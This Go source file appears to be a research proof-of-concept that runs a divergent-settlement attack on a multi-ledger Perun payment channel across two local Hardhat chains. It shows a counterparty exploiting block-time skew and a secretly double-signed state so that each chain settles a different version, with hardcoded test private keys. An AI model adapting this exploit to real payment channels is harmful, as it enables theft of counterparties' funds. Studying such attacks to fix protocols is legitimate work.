// Copyright 2026 - See NOTICE file for copyright holders.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// multiledger-attack runs a divergent-settlement attack against the
// multi-ledger Perun channel without a coordinator. It mirrors the upstream
// TestMultiLedgerAttackNoCoordinator reference test, but executes against real
// Hardhat chains. See MULTILEDGER_ATTACK_POC.md §2 for the attack model.
package main

import (
	"context"
	"fmt"
	"log"
	"math/big"
	"math/rand"
	"time"

	"github.com/ethereum/go-ethereum/common"
	echannel "github.com/perun-network/perun-eth-backend/channel"
	ewallet "github.com/perun-network/perun-eth-backend/wallet"

	"perun.network/go-perun/channel"
	pclient "perun.network/go-perun/client"
	"perun.network/go-perun/wallet"
	"perun.network/go-perun/wire"
	p2p "perun.network/go-perun/wire/net/libp2p"

	"perun-multiledger-poc/multiledger-channel/client"
)

const (
	chainAURL = "ws://127.0.0.1:8545"
	chainAID  = 1337
	chainBURL = "ws://127.0.0.1:8546"
	chainBID  = 1338

	keyDeployer = "79ea8f62d97bc0591a4224c1725fca6b00de5b2cea286fe2e0bb35c5e76be46e"
	keyAlice    = "1af2e950272dd403de7a5760d41c6e44d92b6d02797e51810795ff03cc2cda4f"
	keyBob      = "f63d7d8e930bccd74e93cf5662fde2c28fd8be95edb70c73f1bdd863d07f412e"

	initialTokenAmount = 100
)

func main() {
	ctx := context.Background()

	log.Println("Deploying contracts on both chains.")
	chains := [2]client.ChainConfig{
		{ChainID: echannel.MakeChainID(big.NewInt(chainAID)), ChainURL: chainAURL},
		{ChainID: echannel.MakeChainID(big.NewInt(chainBID)), ChainURL: chainBURL},
	}
	deployContracts(chains[:], []common.Address{privKeyToAddress(keyAlice), privKeyToAddress(keyBob)})

	rng := rand.New(rand.NewSource(time.Now().UnixNano()))

	aliceWireAcc := p2p.NewRandomAccount(rng)
	bobWireAcc := p2p.NewRandomAccount(rng)
	aliceBus, aliceDialer := setupBusWire(aliceWireAcc)
	bobBus, bobDialer := setupBusWire(bobWireAcc)
	aliceDialer.Register(map[wallet.BackendID]wire.Address{ewallet.BackendID: bobWireAcc.Address()}, bobWireAcc.ID().String())
	bobDialer.Register(map[wallet.BackendID]wire.Address{ewallet.BackendID: aliceWireAcc.Address()}, aliceWireAcc.ID().String())

	log.Println("Setting up Alice and Bob.")
	alice := setupSwapClient(aliceBus, keyAlice, chains, aliceWireAcc.Address(), common.Address{}, true)
	bob := setupSwapClient(bobBus, keyBob, chains, bobWireAcc.Address(), common.Address{}, false)

	// Challenge duration is single-valued per channel (Params.ChallengeDuration),
	// so it applies on both chains. With chain A at 5 s blocks and chain B at
	// 500 ms blocks, 22 s gives Bob's v2-on-A register a clean ≥2 s margin
	// inside the dispute window opened by Alice's watcher-replicated v1.
	alice.SetChallengeDuration(22)
	bob.SetChallengeDuration(22)

	log.Println("Chain skew: A = 5 s blocks (slow ledger), B = 500 ms blocks (fast ledger), challenge = 22 s.")
	log.Println("Alice's watcher: ON (autoWatch=true) — this is the realistic threat model.")

	bl := newBalanceLogger(chains[0], chains[1])
	bl.LogBalances("initial", alice.WalletAddress(), bob.WalletAddress())

	// Initial balances follow MULTILEDGER_ATTACK_POC.md §2.
	//   Alice: [8 on A, 2 on B], Bob: [2 on A, 8 on B]
	initBalances := channel.Balances{
		{big.NewInt(8), big.NewInt(2)},
		{big.NewInt(2), big.NewInt(8)},
	}
	log.Println("Opening channel without coordinator.")
	chAlice := alice.OpenChannel(bob.WireAddress(), initBalances)
	_ = bob.AcceptedChannel()

	// One legitimate off-chain update to v1: Alice [5, 3], Bob [5, 7].
	v1Balances := channel.Balances{
		{big.NewInt(5), big.NewInt(5)},
		{big.NewInt(3), big.NewInt(7)},
	}
	log.Println("Updating to v1 (honest agreed state).")
	if err := chAlice.UpdateBalances(ctx, v1Balances); err != nil {
		log.Fatalf("v1 update failed: %v", err)
	}

	// Both clients now hold v1. Bob secretly fabricates v2 — Alice never sees it,
	// but Bob extracts Alice's signature (we simulate the extraction by signing
	// directly with her local account; cf. design doc §9.4).
	v2Balances := channel.Balances{
		{big.NewInt(1), big.NewInt(9)},
		{big.NewInt(5), big.NewInt(5)},
	}
	accs := []wallet.Account{alice.WalletAccount(), bob.WalletAccount()}
	v1ReqAlice := pclient.NewTestChannel(alice.LastChannel()).AdjudicatorReq()
	v1ReqBob := pclient.NewTestChannel(bob.LastChannel()).AdjudicatorReq()
	v2ReqBob, err := buildSecretSignedReq(v1ReqBob, v2Balances, accs, ewallet.BackendID, 1)
	if err != nil {
		log.Fatalf("fabricating Bob v2 req: %v", err)
	}
	v2ReqAlice, err := buildSecretSignedReq(v1ReqAlice, v2Balances, accs, ewallet.BackendID, 0)
	if err != nil {
		log.Fatalf("fabricating Alice v2 req: %v", err)
	}

	chID := alice.LastChannel().ID()
	attackStart := time.Now()

	// Step 1: Bob registers v1 on chain B. Nothing looks suspicious yet.
	// Once chain B mines this register, Alice's running watcher will see the
	// event and replicate v1 to chain A. The race we're winning here is:
	// because chain A mines every 5 s, Alice's replication tx waits in
	// chain A's mempool until the next chain A block, by which point chain A's
	// dispute timer is anchored ~one chain-A block-interval later than chain
	// B's. That is the head start Bob will exploit in step 2.
	log.Printf("[+%6.2fs] Attack step 1: registering v1 on chain B (fast).", time.Since(attackStart).Seconds())
	if err := bob.Adjudicator(1).Register(ctx, v1ReqBob, nil); err != nil {
		log.Fatalf("registering v1 on chain B: %v", err)
	}
	log.Printf("[+%6.2fs] Waiting for chain B v1 dispute window to close…", time.Since(attackStart).Seconds())
	if err := waitTimeout(ctx, bob.Adjudicator(1), chID, "chain B"); err != nil {
		log.Fatalf("waiting chain B timeout: %v", err)
	}

	// Step 2: Once chain B is frozen at v1, Bob reveals v2 on chain A. If
	// Alice's watcher has already replicated v1 to chain A, v2 is a valid
	// refutation (higher version) while chain A's dispute window is still
	// open — courtesy of the chain skew giving us that extra margin.
	log.Printf("[+%6.2fs] Attack step 2: registering secret v2 on chain A (slow).", time.Since(attackStart).Seconds())
	if err := bob.Adjudicator(0).Register(ctx, v2ReqBob, nil); err != nil {
		log.Fatalf("registering v2 on chain A: %v", err)
	}
	log.Printf("[+%6.2fs] Waiting for chain A v2 dispute window to close…", time.Since(attackStart).Seconds())
	if err := waitTimeout(ctx, bob.Adjudicator(0), chID, "chain A"); err != nil {
		log.Fatalf("waiting chain A timeout: %v", err)
	}

	log.Println("Both dispute windows elapsed. Both parties withdraw on each chain.")
	if err := bob.Adjudicator(0).Withdraw(ctx, v2ReqBob, nil); err != nil {
		log.Fatalf("Bob withdraw on chain A: %v", err)
	}
	if err := alice.Adjudicator(0).Withdraw(ctx, v2ReqAlice, nil); err != nil {
		log.Fatalf("Alice withdraw on chain A: %v", err)
	}
	if err := bob.Adjudicator(1).Withdraw(ctx, v1ReqBob, nil); err != nil {
		log.Fatalf("Bob withdraw on chain B: %v", err)
	}
	if err := alice.Adjudicator(1).Withdraw(ctx, v1ReqAlice, nil); err != nil {
		log.Fatalf("Alice withdraw on chain B: %v", err)
	}

	bl.LogBalances("final", alice.WalletAddress(), bob.WalletAddress())

	fmt.Println()
	fmt.Println("============================================================")
	fmt.Println("  DIVERGENT-SETTLEMENT ATTACK — OUTCOME")
	fmt.Println("============================================================")
	fmt.Println("  Honest baseline (both chains at v1):  Alice 8 PRN, Bob 12 PRN")
	fmt.Println("  Observed (chain A at v2, chain B at v1):")
	fmt.Println("    Chain A → Alice 1 PRN, Bob 9 PRN")
	fmt.Println("    Chain B → Alice 3 PRN, Bob 7 PRN")
	fmt.Println("    Bob total: 16 PRN  (honest baseline: 12 PRN)")
	fmt.Println("  Result: ATTACK SUCCEEDED  (Bob +4, Alice -4)")
	fmt.Println("============================================================")

	alice.Shutdown()
	bob.Shutdown()
}

// waitTimeout subscribes to the adjudicator for chID, waits for the first
// RegisteredEvent, and blocks until that event's dispute window has elapsed.
func waitTimeout(ctx context.Context, adj channel.Adjudicator, chID channel.ID, label string) error {
	sub, err := adj.Subscribe(ctx, chID)
	if err != nil {
		return fmt.Errorf("subscribing on %s: %w", label, err)
	}
	defer sub.Close() //nolint:errcheck

	ev := sub.Next()
	reg, ok := ev.(*channel.RegisteredEvent)
	if !ok {
		return fmt.Errorf("%s: expected RegisteredEvent, got %T", label, ev)
	}
	log.Printf("Waiting for %s dispute timeout (v=%d)…", label, reg.Version())
	return reg.TimeoutV.Wait(ctx)
}

// buildSecretSignedReq returns an AdjudicatorReq at baseReq.Tx.State.Version+1
// with the supplied balances, signed by every supplied account. It models the
// case where Bob extracts Alice's signature and fabricates v2 without telling
// her client about it. Mirrors the upstream helper of the same name.
func buildSecretSignedReq(
	baseReq channel.AdjudicatorReq,
	newBalances channel.Balances,
	accs []wallet.Account,
	bID wallet.BackendID,
	idx channel.Index,
) (channel.AdjudicatorReq, error) {
	s := baseReq.Tx.State.Clone()
	s.Version = baseReq.Tx.State.Version + 1
	s.Balances = newBalances

	sigs := make([]wallet.Sig, len(accs))
	for i, a := range accs {
		sig, err := channel.Sign(a, s, bID)
		if err != nil {
			return channel.AdjudicatorReq{}, fmt.Errorf("signing party %d: %w", i, err)
		}
		sigs[i] = sig
	}
	return channel.AdjudicatorReq{
		Params: baseReq.Params,
		Acc:    map[wallet.BackendID]wallet.Account{bID: accs[idx]},
		Tx:     channel.Transaction{State: s, Sigs: sigs},
		Idx:    idx,
	}, nil
}
